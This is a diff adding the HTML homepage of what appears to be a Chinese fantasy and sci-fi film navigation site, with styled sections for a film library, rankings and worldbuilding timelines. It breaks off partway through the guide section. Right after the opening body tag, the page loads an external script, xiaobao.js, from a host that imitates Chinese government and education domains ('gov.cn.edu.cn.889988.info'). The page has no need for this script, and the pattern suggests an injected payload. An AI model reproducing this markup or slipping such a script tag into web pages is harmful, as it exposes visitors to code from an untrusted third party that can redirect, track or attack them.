@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="魔力电影网(molidianyingwang-cn.github.io)——奇幻、魔法、科幻与动画电影的垂直导航站，提供魔法片库、魔力热榜、世界观专题、观影指南与高清在线观看索引。">
+<meta name="keywords" content="魔力电影网,molidianyingwang-cn,魔力电影,奇幻电影,魔法电影,科幻电影,动画电影,哈利波特,指环王,在线观看">
+<meta name="author" content="魔力电影网">
+<meta name="robots" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://molidianyingwang-cn.github.io/">
+<meta property="og:title" content="魔力电影网 - 奇幻·魔法·科幻电影导航站">
+<meta property="og:description" content="魔力电影网聚焦奇幻、魔法、科幻与动画电影，提供魔法片库、魔力热榜、世界观专题与观影指南。">
+<meta property="og:url" content="https://molidianyingwang-cn.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="zh_CN">
+<title>魔力电影网 - 奇幻·魔法·科幻电影导航站 | molidianyingwang-cn.github.io</title>
+<style>
+/* ============ 变量 ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#0d0a1a; --ink2:#15102e; --violet:#7b4dff; --violet2:#a87bff; --fuchsia:#e04dff;
+  --cyan:#3ee0e0; --gold:#ffbf3d; --pink:#ff5ca8; --card:#ffffff; --line:rgba(255,255,255,.16);
+  --r:24px; --shadow:0 28px 60px rgba(8,5,30,.45);
+  --font-sans:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,sans-serif;
+  --font-serif:"Songti SC","Source Han Serif SC","Noto Serif CJK SC","SimSun",serif;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:var(--font-sans);background:#05030f;color:#e9e6f7;line-height:1.8;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.28s cubic-bezier(.4,0,.2,1)}
+img{display:block;max-width:100%;height:auto;object-fit:cover}
+ul,ol{list-style:none}
+button,input{border:0;outline:0;background:0;font-family:inherit}
+.wrap{max-width:1260px;margin:0 auto;padding:0 26px}
+.sec{padding:104px 0;position:relative}
+.eyebrow{font-size:10.5px;letter-spacing:3.4px;color:var(--cyan);font-weight:800;text-transform:uppercase}
+.hd{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap;margin-bottom:42px}
+.hd h2{font-size:clamp(27px,5.2vw,40px);font-weight:950;letter-spacing:.5px}
+.hd h2 em{font-style:normal;background:linear-gradient(92deg,var(--violet2),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hd .en{color:#8f87b8;font-size:10.5px;letter-spacing:3.6px;font-weight:800}
+.hd .more{margin-left:auto;font-size:12.5px;color:#c3bcdf;border:1px solid var(--line);padding:10px 22px;border-radius:30px;backdrop-filter:blur(6px)}
+.hd .more:hover{color:#0d0a1a;background:var(--cyan);border-color:transparent}
+.kw{color:var(--cyan)}
+
+/* ============ 导航 ============ */
+.nav{position:sticky;top:0;z-index:1000;background:rgba(10,7,26,.78);backdrop-filter:blur(18px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;gap:20px;height:76px}
+.logo{display:flex;align-items:center;gap:11px;font-weight:950;font-size:19.5px;white-space:nowrap;letter-spacing:.5px}
+.logo s{text-decoration:none;background:linear-gradient(120deg,var(--violet),var(--fuchsia));color:#fff;padding:7px 14px;border-radius:13px;font-size:13.5px;box-shadow:0 8px 22px rgba(123,77,255,.42)}
+.logo b{font-size:9.5px;color:#8f87b8;letter-spacing:.2px}
+.links{display:flex;gap:4px;margin-left:auto}
+.links a{font-size:14.5px;font-weight:700;padding:11px 16px;border-radius:13px;color:#c3bcdf}
+.links a:hover{color:#fff;background:rgba(123,77,255,.26)}
+.search{display:flex;align-items:center;gap:9px;background:rgba(255,255,255,.06);border:1px solid var(--line);border-radius:14px;padding:9px 15px;width:196px}
+.search input{font-size:13.5px;width:100%;color:#fff}
+.search input::placeholder{color:#7f789e}
+.search span{font-size:12px;flex:none}
+.ham{display:none;width:46px;height:46px;border:1px solid var(--line);border-radius:13px;color:#fff;font-size:21px;cursor:pointer}
+
+/* ============ ① Hero：星空视差 + 浮动卡片 ============ */
+.hero{min-height:min(92vh,760px);display:grid;place-items:center;position:relative;overflow:hidden}
+.stars,.stars2{position:absolute;inset:0;pointer-events:none}
+.stars{background-image:radial-gradient(1.5px 1.5px at 12% 18%,#fff 50%,transparent),radial-gradient(1px 1px at 28% 62%,#cbbbff 50%,transparent),radial-gradient(1.5px 1.5px at 46% 30%,#fff 50%,transparent),radial-gradient(1px 1px at 64% 76%,#aeeeee 50%,transparent),radial-gradient(1px 1px at 82% 22%,#fff 50%,transparent),radial-gradient(1.2px 1.2px at 38% 86%,#ffd7a0 50%,transparent),radial-gradient(1px 1px at 74% 48%,#fff 50%,transparent),radial-gradient(1px 1px at 20% 44%,#d8c6ff 50%,transparent);animation:tw 6s ease-in-out infinite alternate}
+.stars2{background-image:radial-gradient(2px 2px at 8% 52%,var(--gold) 50%,transparent),radial-gradient(1.6px 1.6px at 54% 12%,var(--cyan) 50%,transparent),radial-gradient(1.8px 1.8px at 88% 64%,var(--pink) 50%,transparent);animation:tw2 4s ease-in-out infinite alternate}
+@keyframes tw{from{opacity:.55}to{opacity:1}}
+@keyframes tw2{from{transform:translateY(14px);opacity:.4}to{transform:translateY(-14px);opacity:1}}
+.aurora{position:absolute;inset:0;background:radial-gradient(520px 340px at 18% 8%,rgba(123,77,255,.42),transparent 60%),radial-gradient(480px 320px at 86% 22%,rgba(224,77,255,.3),transparent 60%),radial-gradient(460px 300px at 50% 108%,rgba(62,224,224,.24),transparent 60%);filter:blur(20px)}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1.25fr .75fr;gap:54px;align-items:center}
+.hero h1{font-size:clamp(40px,9vw,82px);line-height:1.05;font-weight:960;letter-spacing:1px}
+.hero h1 span{display:block;background:linear-gradient(96deg,var(--violet2) 0%,var(--cyan) 55%,var(--gold) 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{margin-top:20px;color:#b8b0d6;font-size:clamp(15px,2vw,18.5px);max-width:560px;text-align:justify}
+.cta{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap}
+.cta a:first-child{background:linear-gradient(120deg,var(--violet),var(--fuchsia));color:#fff;font-weight:950;padding:17px 34px;border-radius:16px;box-shadow:0 16px 36px rgba(123,77,255,.4);font-size:15.5px}
+.cta a:first-child:hover{transform:translateY(-3px)}
+.cta a:last-child{border:1px solid var(--line);color:#d4cff0;padding:17px 28px;border-radius:16px;font-weight:800;font-size:15px}
+.cta a:last-child:hover{background:rgba(255,255,255,.07);color:#fff}
+.fx{position:relative;display:grid;gap:16px}
+.fx .mc{background:rgba(255,255,255,.05);border:1px solid var(--line);backdrop-filter:blur(14px);border-radius:20px;padding:20px;box-shadow:var(--shadow);animation:fl 7s ease-in-out infinite}
+.fx .mc:nth-child(2){transform:translateX(34px) rotate(3deg);animation-delay:-2.4s}
+.fx .mc:nth-child(3){transform:translateX(12px) rotate(-2.4deg);animation-delay:-4.6s}
+@keyframes fl{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-12px) rotate(1.6deg)}}
+.mc .rk{display:flex;justify-content:space-between;font-size:10.5px;letter-spacing:1.6px;color:var(--cyan);font-weight:900}
+.mc h4{font-size:16.5px;margin:7px 0 10px}
+.mc .bar{height:6px;border-radius:5px;background:rgba(255,255,255,.1);overflow:hidden}
+.mc .bar i{display:block;height:100%;width:0;border-radius:5px;background:linear-gradient(90deg,var(--violet2),var(--cyan))}
+.mc p{font-size:12px;color:#9b93be;margin-top:10px}
+
+/* ============ ② 片库：斜切瀑布流 ============ */
+.lib{background:linear-gradient(180deg,#05030f,#09061c)}
+.wall{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.film{position:relative;border-radius:var(--r);overflow:hidden;background:#110b2c;transition:.36s;clip-path:polygon(0 0,100% 0,100% 92%,0 100%)}
+.film:nth-child(odd){transform:translateY(26px)}
+.film:hover{transform:translateY(-8px) !important;z-index:3;box-shadow:var(--shadow)}
+.film .cv{aspect-ratio:2/3;overflow:hidden;position:relative}
+.film .cv img{width:100%;height:100%;transition:.8s}
+.film:hover .cv img{transform:scale(1.09)}
+.film .cv .badge{position:absolute;top:12px;left:12px;background:rgba(13,10,26,.72);backdrop-filter:blur(6px);border:1px solid var(--line);color:var(--gold);font-size:11px;font-weight:900;padding:5px 11px;border-radius:9px;letter-spacing:.6px}
+.film .cv .play{position:absolute;inset:0;display:grid;place-items:center;background:rgba(8,5,30,.4);opacity:0;transition:.3s;font-size:46px}
+.film:hover .cv .play{opacity:1}
+.film .tx{padding:16px 18px 22px}
+.film .tx h3{font-size:16.5px;line-height:1.42;margin-bottom:5px}
+.film .tx small{font-size:11px;color:#8f87b8;letter-spacing:1px}
+.film .tx .row{display:flex;justify-content:space-between;margin-top:12px;font-size:11.5px;font-weight:800;color:var(--cyan);border-top:1px dashed var(--line);padding-top:10px}
+
+/* ============ ③ 热榜：进度条排行榜 ============ */
+.hot{background:#09061c}
+.ranks{display:grid;gap:13px}
+.rk{display:grid;grid-template-columns:66px 1fr 108px;align-items:center;gap:18px;background:rgba(255,255,255,.035);border:1px solid var(--line);border-radius:18px;padding:15px 20px;transition:.28s}
+.rk:hover{background:rgba(123,77,255,.14);border-color:rgba(168,123,255,.6);transform:translateX(8px)}
+.rk .n{font-size:26px;font-weight:960;font-family:var(--font-serif);text-align:center;line-height:1}
+.rk .n i{font-style:normal}
+.rk:nth-child(1) .n{color:var(--gold)}
+.rk:nth-child(2) .n{color:#d7dde6}
+.rk:nth-child(3) .n{color:#cd8a5c}
+.rk .mi h3{font-size:17px;line-height:1.4}
+.rk .mi p{font-size:12px;color:#8f87b8;margin-top:3px}
+.rk .lv{font-size:11px;color:#9b93be}
+.rk .lv b{display:block;color:var(--cyan);font-size:13px;letter-spacing:.6px}
+.rk .lv .p{height:5px;border-radius:5px;background:rgba(255,255,255,.1);margin-top:7px;overflow:hidden}
+.rk .lv .p i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--violet),var(--cyan))}
+
+/* ============ ④ 世界观专题：标签页 + 时间线 ============ */
+.world{background:linear-gradient(180deg,#09061c,#05030f)}
+.tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:30px}
+.tabs b{font-size:13px;font-weight:800;padding:11px 20px;border-radius:13px;border:1px solid var(--line);color:#b3abd0;cursor:pointer;letter-spacing:.6px}
+.tabs b.on{background:linear-gradient(120deg,var(--violet),var(--fuchsia));color:#fff;border-color:transparent;box-shadow:0 10px 24px rgba(123,77,255,.36)}
+.pan{display:none;grid-template-columns:1.05fr .95fr;gap:46px;align-items:center;animation:in .5s ease}
+.pan.on{display:grid}
+@keyframes in{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+.pan .txt h3{font-size:clamp(24px,4vw,34px);line-height:1.4;margin-bottom:14px}
+.pan .txt p{color:#a79fca;font-size:15px;text-align:justify}
+.pan .txt .keys{display:flex;gap:8px;flex-wrap:wrap;margin:20px 0 24px}
+.pan .txt .keys i{font-style:normal;font-size:11.5px;padding:7px 15px;border-radius:20px;background:rgba(62,224,224,.1);color:var(--cyan);border:1px solid rgba(62,224,224,.3)}
+.pan .txt a{display:inline-flex;align-items:center;gap:8px;padding:14px 28px;border-radius:14px;background:#fff;color:#0d0a1a;font-weight:950;font-size:14.5px}
+.pan .tl{position:relative;padding-left:30px}
+.pan .tl::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--violet2),var(--cyan))}
+.pan .tl .nd{position:relative;padding:0 0 24px}
+.pan .tl .nd::before{content:"";position:absolute;left:-27px;top:7px;width:12px;height:12px;border-radius:50%;background:var(--cyan);box-shadow:0 0 0 4px rgba(62,224,224,.18)}
+.pan .tl .nd b{font-size:10.5px;letter-spacing:1.8px;color:var(--gold);font-weight:900}
+.pan .tl .nd h4{font-size:16.5px;margin:2px 0 5px}
+.pan .tl .nd p{font-size:12.5px;color:#8f87b8}
+
+/* ============ ⑤ 观影指南：横向滑动杂志卡 ============ */
+.guide{background:#05030f}
+.belt{display:flex;gap:20px;overflow-x:auto;scroll-snap-type:x mandatory;padding:8px 4px 26px;scrollbar-width:thin;scrollbar-color:#3a3270 transparent}
+.belt::-webkit-scrollbar{height:10px}
+.belt::-webkit-scrollbar-thumb{background:#3a3270;border-radius:6px}
+.gd{scroll-snap-align:start;flex:0 0 430px;background:linear-gradient(165deg,#120c30,#0a0620);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.34s}
+.gd:hover{border-color:var(--violet2);box-shadow:var(--shadow);transform:translateY(-6px)}
+.gd figure{position:relative;height:190px;overflow:hidden}
+.gd figure img{width:100%;height:100%;transition:.8s}
+.gd:hover figure img{transform:scale(1.07)}
+.gd figure .cat{position:absolute;top:13px;left:13px;background:var(--violet);color:#fff;font-size:10.5px;font-weight:900;letter-spacing:1.4px;padding:6px 13px;border-radius:9px}
+.gd .tx{padding:22px 24px}
+.gd .tx h3{font-size:20px;line-height:1.5;margin-bottom:10px}
+.gd .tx p{font-size:13px;color:#9b93be;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.gd .tx .ft{display:flex;gap:16px;margin-top:16px;font-size:11.5px;color:var(--cyan);font-weight:800;border-top:1px dashed var(--line);padding-top:12px}
+
+/* ============ ⑥ 关于 + 订阅 ============ */
+.us{background:radial-gradient(640px 400px at 90% 10%,rgba(224,77,255,.18),transparent 58%),radial-gradient(520px 340px at 4% 96%,rgba(62,224,224,.14),transparent 56%)}
+.uslay{display:grid;grid-template-columns:1fr 450px;gap:62px;align-items:center}
+.us h2{font-size:clamp(28px,5.6vw,46px);font-weight:960;line-height:1.3;margin-bottom:18px}
+.us h2 u{text-decoration:none;color:var(--cyan)}
+.us > p{color:#a79fca;font-size:15px;text-align:justify}
+.feats{margin:26px 0 30px;display:grid;gap:12px}
+.feats div{display:grid;grid-template-columns:46px 1fr;gap:16px;align-items:center;background:rgba(255,255,255,.045);border:1px solid var(--line);border-radius:16px;padding:16px 20px;font-size:14.5px}
+.feats div s{text-decoration:none;width:46px;height:46px;border-radius:15px;background:linear-gradient(135deg,var(--violet),var(--fuchsia));display:grid;place-items:center;font-size:19px;box-shadow:0 10px 22px rgba(123,77,255,.34)}
+.sub{background:linear-gradient(160deg,#160f3d,#0a0620);border:1px solid var(--line);border-radius:28px;padding:36px;box-shadow:var(--shadow)}
+.sub h3{font-size:24px;margin-bottom:8px}
+.sub > p{font-size:13px;color:#9b93be;margin-bottom:24px}
+.inpg{display:grid;gap:12px;margin-bottom:18px}
+.inpg input{background:rgba(255,255,255,.07);border:1px solid var(--line);border-radius:14px;padding:16px 17px;color:#fff;font-size:14px}
+.inpg input:focus{border-color:var(--cyan)}
+.inpg button{background:linear-gradient(120deg,var(--cyan),var(--violet2));color:#0d0a1a;border-radius:14px;padding:16px;font-weight:960;font-size:15.5px;cursor:pointer}
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chips i{font-style:normal;font-size:11.5px;padding:8px 15px;border-radius:20px;background:rgba(255,255,255,.06);border:1px solid var(--line);color:#c3bcdf}
+
+/* ============ 页脚 ============ */
+footer{border-top:1px solid var(--line);background:#04020c;padding:62px 0 26px}
+.fg{display:grid;grid-template-columns:2.2fr 1fr 1fr 1fr;gap:32px;margin-bottom:38px}
+.fo .logo{margin-bottom:16px}
+.fo p{color:#7f789e;font-size:13.5px;max-width:360px;line-height:1.85}
+.socs{display:flex;gap:10px;margin-top:18px}
+.socs a{width:45px;height:45px;border-radius:15px;background:rgba(255,255,255,.05);border:1px solid var(--line);display:grid;place-items:center;font-size:15px}
+.socs a:hover{color:var(--cyan);border-color:var(--cyan);transform:translateY(-3px)}
+.fcol h4{font-size:15px;margin-bottom:16px;padding-left:13px;position:relative}
+.fcol h4::before{content:"";position:absolute;left:0;top:3px;bottom:3px;width:3px;border-radius:2px;background:linear-gradient(var(--violet2),var(--cyan))}
+.fcol a{display:block;color:#8f87b8;font-size:13.5px;padding:6px 0}
+.fcol a:hover{color:var(--cyan);padding-left:7px}
+.copy{text-align:center;color:#6d6691;font-size:12.5px;border-top:1px solid var(--line);padding-top:26px;line-height:1.95}
+.copy b{color:var(--cyan)}
+
+.top{position:fixed;right:18px;bottom:26px;width:52px;height:52px;border-radius:16px;background:linear-gradient(135deg,var(--violet),var(--fuchsia));color:#fff;cursor:pointer;z-index:999;box-shadow:var(--shadow);opacity:0;visibility:hidden;transition:.3s;font-size:21px}
+.top.show{opacity:1;visibility:visible}
+
+/* ============ 响应式 ============ */
+@media(max-width:1120px){.wall{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:1000px){
+  .hero .wrap{grid-template-columns:1fr;gap:34px}
+  .fx{grid-template-columns:repeat(2,1fr);max-width:640px}
+  .fx .mc:nth-child(n){transform:none}
+  .pan{grid-template-columns:1fr;gap:26px}
+  .uslay{grid-template-columns:1fr;gap:34px}
+  .fg{grid-template-columns:1fr 1fr;gap:28px}
+}
+@media(max-width:720px){
+  .ham{display:block}
+  .links{position:fixed;inset:76px 0 0 0;background:rgba(9,6,28,.98);backdrop-filter:blur(16px);flex-direction:column;padding:26px 18px;gap:8px;transform:translateX(100%);transition:.35s;z-index:999}
+  .links.open{transform:translateX(0)}
+  .links a{font-size:18px;padding:18px 18px}
+  .search{display:none}
+  .sec{padding:64px 0}
+  .wall{grid-template-columns:repeat(2,1fr);gap:13px}
+  .film:nth-child(odd){transform:none}
+  .film .tx h3{font-size:14.5px}
+  .rk{grid-template-columns:44px 1fr 74px;gap:12px;padding:14px}
+  .rk .n{font-size:19px}
+  .rk .lv{display:none}
+  .gd{flex:0 0 300px}
+  .gd figure{height:150px}
+}
+@media print{.nav,.top,.belt{display:none}body{background:#fff;color:#000}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ===== 导航 ===== -->
+<header class="nav">
+  <div class="wrap">
+    <a class="logo" href="#top" aria-label="魔力电影网">
+      <s>魔力电影网</s><b>molidianyingwang-cn.github.io</b>
+    </a>
+    <nav class="links" id="links">
+      <a href="#top">首页</a>
+      <a href="#lib">魔法片库</a>
+      <a href="#hot">魔力热榜</a>
+      <a href="#world">世界观</a>
+      <a href="#guide">观影指南</a>
+      <a href="#us">关于本站</a>
+    </nav>
+    <label class="search"><input type="search" placeholder="搜影片、导演、魔法体系…" aria-label="搜索"><span>🔎</span></label>
+    <button class="ham" id="ham" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- ===== ① Hero：星空视差 + 浮动卡片 ============ -->
+<section class="hero" id="top">
+  <div class="stars"></div><div class="stars2"></div><div class="aurora"></div>
+  <div class="wrap">
+    <div class="hc">
+      <div class="eyebrow">Fantasy · Magic · Sci-Fi</div>
+      <h1>每一帧，<span>都是一次施法</span></h1>
+      <p><b class="kw">魔力电影网</b>专注奇幻、魔法、科幻与动画电影的垂直导航。我们不只告诉你“演了什么”，更带你拆开那些让银幕发光的视觉咒语——从指环王的中土世界到赛博朋克的霓虹雨夜。</p>
+      <div class="cta"><a href="#lib">🚀 进入魔法片库</a><a href="#guide">📖 观影指南</a></div>
+    </div>
+    <aside class="fx">
+      <div class="mc"><div class="rk"><span>本周热度</span><span>LIVE</span></div><h4>指环王：王者无敌 4K 重制</h4><div class="bar"><i data-w="92"></i></div><p>中土史诗的终章，光影重建</p></div>
+      <div class="mc"><div class="rk"><span>期待值</span><span>98%</span></div><h4>魔法部：新纪元</h4><div class="bar"><i data-w="86"></i></div><p>魔法世界观的全新扩张</p></div>
+      <div class="mc"><div class="rk"><span>口碑</span><span>9.4</span></div><h4>千与千寻</h4><div class="bar"><i data-w="96"></i></div><p>宫崎骏的魔法，是长大的代价</p></div>
+    </aside>
+  </div>
+</section>
+
+<!-- ===== ② 片库：斜切瀑布流 ============ -->
+<section class="lib" id="lib">
+  <div class="wrap">
+    <div class="hd"><div class="eyebrow">Magic Library</div><h2><em>▍</em>魔法片库</h2><span class="en">FILM LIBRARY</span><a class="more" href="#">完整片库 →</a></div>
+    <div class="wall">
+      <a class="film" href="#"><div class="cv"><img src="https://picsum.photos/id/1031/360/540" alt="指环王" loading="lazy"><span class="badge">史诗奇幻</span><span class="play">▶</span></div><div class="tx"><h3>指环王：王者无敌</h3><small>2003 · 彼得·杰克逊</small><div class="row"><span>4K 重制</span><span>★ 9.2</span></div></div></a>
+      <a class="film" href="#"><div class="cv"><img src="https://picsum.photos/id/1041/360/540" alt="哈利波特" loading="lazy"><span class="badge">魔法校园</span><span class="play">▶</span></div><div class="tx"><h3>哈利·波特与魔法石</h3><small>2001 · 克里斯·哥伦布</small><div class="row"><span>合集 8 部</span><span>★ 8.7</span></div></div></a>
+      <a class="film" href="#"><div class="cv"><img src="https://picsum.photos/id/1062/360/540" alt="星际穿越" loading="lazy"><span class="badge">硬科幻</span><span class="play">▶</span></div><div class="tx"><h3>星际穿越</h3><small>2014 · 克里斯托弗·诺兰</small><div class="row"><span>IMAX 70mm</span><span>★ 9.1</span></div></div></a>
+      <a class="film" href="#"><div class="cv"><img src="https://picsum.photos/id/1045/360/540" alt="千与千寻" loading="lazy"><span class="badge">动画奇幻</span><span class="play">▶</span></div><div class="tx"><h3>千与千寻</h3><small>2001 · 宫崎骏</small><div class="row"><span>奥斯卡最佳</span><span>★ 9.4</span></div></div></a>
+      <a class="film" href="#"><div class="cv"><img src="https://picsum.photos/id/1050/360/540" alt="阿凡达" loading="lazy"><span class="badge">视效革命</span><span class="play">▶</span></div><div class="tx"><h3>阿凡达：水之道</h3><small>2022 · 詹姆斯·卡梅隆</small><div class="row"><span>3D 高帧率</span><span>★ 8.3</span></div></div></a>
+      <a class="film" href="#"><div class="cv"><img src="https://picsum.photos/id/1083/360/540" alt="盗梦空间" loading="lazy"><span class="badge">梦境科幻</span><span class="play">▶</span></div><div class="tx"><h3>盗梦空间</h3><small>2010 · 克里斯托弗·诺兰</small><div class="row"><span>嵌套叙事</span><span>★ 9.0</span></div></div></a>
+      <a class="film" href="#"><div class="cv"><img src="https://picsum.photos/id/1074/360/540" alt="潘神的迷宫" loading="lazy"><span class="badge">暗黑童话</span><span class="play">▶</span></div><div class="tx"><h3>潘神的迷宫</h3><small>2006 · 吉尔莫·德尔·托罗</small><div class="row"><span>成人童话</span><span>★ 8.8</span></div></div></a>
+      <a class="film" href="#"><div class="cv"><img src="https://picsum.photos/id/1067/360/540" alt="奇异博士" loading="lazy"><span class="badge">超级英雄</span><span class="play">▶</span></div><div class="tx"><h3>奇异博士：疯狂多元宇宙</h3><small>2022 · 山姆·雷米</small><div class="row"><span>多维特效</span><span>★ 7.6</span></div></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ③ 热榜：进度条排行榜 ============ -->
+<section class="hot" id="hot">
+  <div class="wrap">
+    <div class="hd"><div class="eyebrow">Magic Ranking</div><h2><em>▍</em>魔力热榜</h2><span class="en">TOP 10</span><a class="more" href="#">完整榜单 →</a></div>
+    <div class="ranks">
+      <a class="rk" href="#"><span class="n"><i>01</i></span><div class="mi"><h3>指环王：护戒使者</h3><p>史诗奇幻 · 中土世界的开端，重制版画质重生</p></div><div class="lv"><span>魔力值</span><b>98.6</b><div class="p"><i data-w="98"></i></div></div></a>
+      <a class="rk" href="#"><span class="n"><i>02</i></span><div class="mi"><h3>哈利·波特与死亡圣器（下）</h3><p>魔法校园 · 霍格沃茨大战，十年系列的句点</p></div><div class="lv"><span>魔力值</span><b>95.2</b><div class="p"><i data-w="95"></i></div></div></a>
+      <a class="rk" href="#"><span class="n"><i>03</i></span><div class="mi"><h3>千与千寻</h3><p>动画奇幻 · 隧道另一端的神明澡堂</p></div><div class="lv"><span>魔力值</span><b>93.7</b><div class="p"><i data-w="93"></i></div></div></a>
+      <a class="rk" href="#"><span class="n"><i>04</i></span><div class="mi"><h3>星际穿越</h3><p>硬科幻 · 当爱成为跨越维度的坐标</p></div><div class="lv"><span>魔力值</span><b>91.0</b><div class="p"><i data-w="91"></i></div></div></a>
+      <a class="rk" href="#"><span class="n"><i>05</i></span><div class="mi"><h3>盗梦空间</h3><p>梦境科幻 · 陀螺停下的那一刻，你在哪一层？</p></div><div class="lv"><span>魔力值</span><b>89.4</b><div class="p"><i data-w="89"></i></div></div></a>
+      <a class="rk" href="#"><span class="n"><i>06</i></span><div class="mi"><h3>潘神的迷宫</h3><p>暗黑童话 · 战争的残酷，与地下王国的温柔</p></div><div class="lv"><span>魔力值</span><b>87.1</b><div class="p"><i data-w="87"></i></div></div></a>
+      <a class="rk" href="#"><span class="n"><i>07</i></span><div class="mi"><h3>阿凡达</h3><p>视效革命 · 潘多拉星球的蓝色呼吸</p></div><div class="lv"><span>魔力值</span><b>84.8</b><div class="p"><i data-w="84"></i></div></div></a>
+      <a class="rk" href="#"><span class="n"><i>08</i></span><div class="mi"><h3>奇异博士</h3><p>多元宇宙 · 纽约圣所的齿轮开始转动</p></div><div class="lv"><span>魔力值</span><b>82.3</b><div class="p"><i data-w="82"></i></div></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ④ 世界观专题：标签页 + 时间线 ============ -->
+<section class="world" id="world">
+  <div class="wrap">
+    <div class="hd"><div class="eyebrow">Worldbuilding</div><h2><em>▍</em>世界观专题</h2><span class="en">WORLDS</span><a class="more" href="#">更多专题 →</a></div>
+    <div class="tabs" id="tabs">
+      <b class="on" data-t="t1">中土世界</b>
+      <b data-t="t2">魔法宇宙</b>
+      <b data-t="t3">赛博废土</b>
+      <b data-t="t4">吉卜力之境</b>
+    </div>
+    <div class="pan on" id="t1">
+      <div class="txt"><h3>中土世界：托尔金的语言炼金术</h3><p>一个世界的说服力，来自它的语言、历法与族谱。托尔金先造精灵语，再写史诗——这也是《指环王》《霍比特人》至今无法被复制的原因：它的魔法有语法。</p><div class="keys"><i># 精灵语</i><i># 矮人锻造</i><i># 魔戒</i><i># 史诗叙事</i></div><a href="#">🗺 查看中土观影顺序 →</a></div>
+      <div class="tl"><div class="nd"><b>Y.T. 3018</b><h4>护戒使者启程</h4><p>比尔博的戒指易主，弗罗多离开夏尔。</p></div><div class="nd"><b>Y.T. 3019</b><h4>圣盔谷之战</h4><p>白袍甘道夫归来，洛汗骑兵驰援。</p></div><div class="nd"><b>Y.T. 3019</b><h4>末日火山</h4><p>咕噜与戒指一同坠入烈焰，第三纪元终结。</p></div></div>
+    </div>
+    <div class="pan" id="t2">
+      <div class="txt"><h3>魔法宇宙：从九又四分之三站台开始</h3><p>魔法世界的魅力不在咒语，而在它的“日常感”：对角巷的物价、魔法部的官僚主义、魁地奇的荒谬规则。正是这些琐碎，让魔杖有了温度。</p><div class="keys"><i># 霍格沃茨</i><i># 四学院</i><i># 魂器</i><i># 魔法史</i></div><a href="#">🧙 查看魔法观影年表 →</a></div>
+      <div class="tl"><div class="nd"><b>1991</b><h4>魔法石</h4><p>“你是个巫师，哈利。”</p></div><div class="nd"><b>1994</b><h4>火焰杯</h4><p>三强争霸赛，黑暗重新抬头。</p></div><div class="nd"><b>1997</b><h4>死亡圣器</h4><p>“始终如一，直到最后。”</p></div></div>
+    </div>
+    <div class="pan" id="t3">
+      <div class="txt"><h3>赛博废土：霓虹之下的人的残影</h3><p>当科技取代神，城市成为新的神话现场。《银翼杀手》《攻壳机动队》《赛博朋克：边缘行者》追问同一件事：如果记忆可以植入，你还是你吗？</p><div class="keys"><i># 赛博朋克</i><i># 仿生人</i><i># 雨夜霓虹</i><i># 意识上传</i></div><a href="#">🤖 查看赛博片单 →</a></div>
+      <div class="tl"><div class="nd"><b>1982</b><h4>银翼杀手</h4><p>雨中的独角兽折纸，记忆是最后的凭证。</p></div><div class="nd"><b>1995</b><h4>攻壳机动队</h4><p>ghost 与 shell 的边界，被动画率先画下。</p></div><div class="nd"><b>2017</b><h4>银翼杀手 2049</h4><p>橙色的光，落在废墟与记忆之间。</p></div></div>
+    </div>
+    <div class="pan" id="t4">
+      <div class="txt"><h3>吉卜力之境：神明、铁路与长大的孩子</h3><p>宫崎骏与高畑勋建造的不是奇幻，而是“被现代遗落的那部分日常”：会走路的城堡、借东西的小人、森林里的龙猫。魔法在这里是温柔的动词。</p><div class="keys"><i># 吉卜力</i><i># 宫崎骏</i><i># 汤屋</i><i># 成长寓言</i></div><a href="#">🌿 查看吉卜力观影顺序 →</a></div>
+      <div class="tl"><div class="nd"><b>1988</b><h4>龙猫</h4><p>橡树根下的神，只在相信的孩子面前出现。</p></div><div class="nd"><b>2001</b><h4>千与千寻</h4><p>记住自己的名字，才不会在神明世界迷路。</p></div><div class="nd"><b>2023</b><h4>苍鹭与少年</h4><p>塔的尽头，是放下与和解。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ⑤ 观影指南：横向滑动杂志卡 ============ -->
+<section class="guide" id="guide">
+  <div class="wrap">
+    <div class="hd"><div class="eyebrow">Watch Guide</div><h2><em>▍</em>观影指南</h2><span class="en">GUIDE</span><a class="more" href="#">全部文章 →</a></div>
+    <div class="belt">
+      <a class="gd" href="#"><figure><img src="https://picsum.photos/id/1041/460/240" alt="配图" loading="lazy"><span class="cat">片单</span></figure><div class="tx"><h3>按时间线看懂中土：指环王 + 霍比特人 6 部正确顺序</h3><p>别按上映年份看。按第三纪元的时间线走，你才会明白甘道夫为何微笑，以及佛罗多的伤口为何永远不愈合。</p><span class="ft">🕒 12 分钟 · 3.2 万阅读</span></div></a>
